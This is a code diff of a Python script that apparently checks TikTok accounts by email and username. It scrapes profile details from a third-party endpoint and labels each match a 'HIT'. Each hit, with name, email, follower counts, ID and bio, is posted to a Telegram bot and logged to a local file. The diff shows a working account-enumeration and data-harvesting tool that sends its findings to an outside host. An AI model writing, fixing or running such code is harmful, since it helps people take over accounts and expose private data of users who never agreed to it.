@@ -87,7 +87,10 @@ def gmail():
                 
                 ui = f'https://qado-tik-info.reback.repl.co/?user={us11}&sess=8'
                 ik = requests.get(ui).text
-                try:
+                if ('اليوزر غير موجود') in ik:
+                    p+=1
+                else:
+            
                     nam = ik.split('name :')[1]
                     name = nam.split('follower')[0]
                     fo = nam.split('follower :')[1]
@@ -101,20 +104,18 @@ def gmail():
                     id1 = ik.split('id :')[1]
                     id = id1.split('posts : ')[0]
                     vieod= ik.split('posts :')[1]
-                except InterruptedError as error:
-                    print('errror')
-            
+              
                 #re2 = requests.get(url2,headers=head2).json()
-                j+=1
-                req = f'HIT : {j}\nName : {name}\nEmail : {email}\nFolloing : {fol}\nFollower : {fols1}\nVideo : {vieod}\nID : {id}\nBio : {bio}\n\nBy : @MVMVP - @FFNZZ'
-                tlg =(f'https://api.telegram.org/bot{took}/sendMessage?chat_id={idddd}&text={req}')
-                ru= requests.post(tlg)
-                try:
-                    with open('true.txt','a') as f8:
-                        f8.write(f'{req}\n')
-                except UnicodeEncodeError as error :
-                    with open('true.txt','a') as f8:
-                        f8.write(f'{req}\n')
+                    j+=1
+                    req = f'HIT : {j}\nName : {name}\nEmail : {email}\nFolloing : {fol}\nFollower : {fols1}\nVideo : {vieod}\nID : {id}\nBio : {bio}\n\nBy : @MVMVP - @FFNZZ'
+                    tlg =(f'https://api.telegram.org/bot{took}/sendMessage?chat_id={idddd}&text={req}')
+                    ru= requests.post(tlg)
+                    try:
+                        with open('true.txt','a') as f8:
+                            f8.write(f'{req}\n')
+                    except UnicodeEncodeError as error :
+                        with open('true.txt','a') as f8:
+                            f8.write(f'{req}\n')
                     
                 
             elif ('"Bind device by email failed"') in ree:
